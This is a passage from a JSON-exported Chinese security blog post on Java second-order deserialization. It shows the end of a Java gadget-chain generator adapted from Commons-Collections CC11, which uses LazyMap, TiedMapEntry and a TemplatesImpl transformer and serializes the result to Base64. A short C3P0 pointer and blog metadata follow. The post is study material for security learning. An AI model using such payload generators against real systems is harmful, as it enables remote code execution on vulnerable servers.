#ABB2BF\">&gt; </span><span style=\"color: #E06C75\">innerMap</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\">&lt;&gt;();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Map</span><span style=\"color: #ABB2BF\">&lt;</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">&gt; </span><span style=\"color: #E06C75\">m</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">LazyMap</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">decorate</span><span style=\"color: #ABB2BF\">(innerMap, transformer);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">outerMap</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">HashMap</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">TiedMapEntry</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">tied</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">TiedMapEntry</span><span style=\"color: #ABB2BF\">(m, templates);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">outerMap</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">put</span><span style=\"color: #ABB2BF\">(tied, </span><span style=\"color: #98C379\">&quot;t&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">innerMap</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">clear</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">setFieldValue</span><span style=\"color: #ABB2BF\">(transformer, </span><span style=\"color: #98C379\">&quot;iMethodName&quot;</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #98C379\">&quot;newTransformer&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//base64转字符输出</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">aos</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ObjectOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">oos</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ObjectOutputStream</span><span style=\"color: #ABB2BF\">(aos);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">oos</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">writeObject</span><span style=\"color: #ABB2BF\">(outerMap);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">oos</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">flush</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">oos</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">close</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">return</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">Base64Encode</span><span style=\"color: #ABB2BF\">(aos);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> setFieldValue</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">obj</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">field</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">arg</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Field</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">f</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">obj</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getClass</span><span style=\"color: #ABB2BF\">().</span><span style=\"color: #61AFEF\">getDeclaredField</span><span style=\"color: #ABB2BF\">(field);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">f</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">setAccessible</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">true</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">f</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">set</span><span style=\"color: #ABB2BF\">(obj, arg);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #61AFEF\"> Base64Encode</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">bs</span><span style=\"color: #ABB2BF\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">byte</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75\">encode</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Base64</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getEncoder</span><span style=\"color: #ABB2BF\">().</span><span style=\"color: #61AFEF\">encode</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">bs</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">toByteArray</span><span style=\"color: #ABB2BF\">());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">s</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">String</span><span style=\"color: #ABB2BF\">(encode);</span></span>\n<span class=\"line\"><span style=\"color: #7F848E; font-style: italic\">//        System.out.println(s);</span></span>\n<span class=\"line\"><span style=\"color: #7F848E; font-style: italic\">//        System.out.println(s.length());</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">return</span><span style=\"color: #ABB2BF\"> s;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">&#125;</span></span></code></pre></div><p>稍微修改了一下 CC11 的 hashmap 生成逻辑，不过区别不大了</p>\n<h1 id=\"wrapperConnectionPoolDataSource\"><a href=\"#wrapperConnectionPoolDataSource\" class=\"headerlink\" title=\"wrapperConnectionPoolDataSource\"></a>wrapperConnectionPoolDataSource</h1><p>具体就不谈了，参考 C3P0 wrapperConnectionPoolDataSource 链分析即可<br><a href=\"https://stoocea.github.io/post/C3P0%E9%93%BE%E5%88%86%E6%9E%90.html#1x01-%E5%88%9D%E6%AD%A5%E5%85%A5%E5%8F%A3%E2%80%94WrapperConnectionPoolDataSource\">https://stoocea.github.io/post/C3P0%E9%93%BE%E5%88%86%E6%9E%90.html#1x01-%E5%88%9D%E6%AD%A5%E5%85%A5%E5%8F%A3%E2%80%94WrapperConnectionPoolDataSource</a></p>\n<p>后记<br>五月份算是比较痛苦的一段时间，一直没有精力或者时间去学习新知识，一直在干活。6 月初好歹闲下来了，继续学，状态稍微回来了一点</p>\n","feature":true,"text":"前言二次反序列化大多数时候是用来绕过黑名单或者解决不出网的问题，不会作为一条单独且完整的利用链存在，而是作为一个中间节点，用来绕过。二次反序列化一般来说有如下几...","permalink":"/post/Java二次反序列化","photos":[],"count_time":{"symbolsCount":"20k","symbolsTime":"18 mins."},"categories":[{"name":"锻刀的理论学习-java二次反序列化","slug":"锻刀的理论学习-java二次反序列化","count":1,"path":"api/categories/锻刀的理论学习-java二次反序列化.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":13,"path":"api/tags/锻刀.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SignedObject\"><span class=\"toc-text\">SignedObject</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Rome\"><span class=\"toc-text\">Rome</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#toStringBean\"><span class=\"toc-text\">toStringBean</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#equalsBean\"><span class=\"toc-text\">equalsBean</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Commons-Beanutils\"><span class=\"toc-text\">Commons-Beanutils</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#RmiConnector\"><span class=\"toc-text\">RmiConnector</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#wrapperConnectionPoolDataSource\"><span class=\"toc-text\">wrapperConnectionPoolDataSource</span></a></li></ol>","author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/06/6688f66750892.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Java字节码初步学习","uid":"d401c16d5adfa98368631db68a02ca33","slug":"Java字节码初步学习","date":"2024-06-10T05:00:00.000Z","updated":"2024-06-28T15:09:11.735Z","comments":true,"path":"api/articles/Java字节码初步学习.json","keywords":null,"cover":"https://bu.dusays.com/2024/03/11/65ee760bd1078.jpg","text":"背景引入我们平常所写的 Java 是不能被 JVM 识别所运行的，必须将其编译成 class 文件，JVM 才能够识别代码，进行对应的程序操作。Java 有着”...","permalink":"/post/Java字节码初步学习","photos":[],"count_time":{"symbolsCount":"10k","symbolsTime":"9 mins."},"categories":[{"name":"锻刀的理论学习-java字节码","slug":"锻刀的理论学习-java字节码","count":1,"path":"api/categories/锻刀的理论学习-java字节码.json"}],"tags":[{"name":"锻刀","slug":"锻刀","count":13,"path":"api/tags/锻刀.json"}],"author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/06/6688f66750892.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"CodeQL学习","uid":"21952381f57493672835351001f3cf9b","slug":"CodeQL学习","date":"2024-05-02T08:00:00.000Z","updated":"2024-06-28T15:08:52.369Z","comments":true,"path":"api/articles/CodeQL学习.json","keywords":null,"cover":"https://bu.dusays.com/2024/06/28/667ecf00d23c4.webp","text":"本文为个人学习笔记+一些个人的理解调试，仅供学习参考 首先存几个学习地点https://drun1baby.top/2023/09/03/CodeQL-%E5%...","permalink":"/post/CodeQL学习","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"16 mins."},"categories":[{"name":"挥刀练习之codeQL","slug":"挥刀练习之codeQL","count":1,"path":"api/categories/挥刀练习之codeQL.json"}],"tags":[{"name":"用刀的技艺","slug":"用刀的技艺","count":1,"path":"api/tags/用刀的技艺.json"}],"author":{"name":"stoocea","slug":"blog-author","avatar":"https://bu.dusays.com/2024/07/06/6688f66750892.png","link":"/","description":"time thick away","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}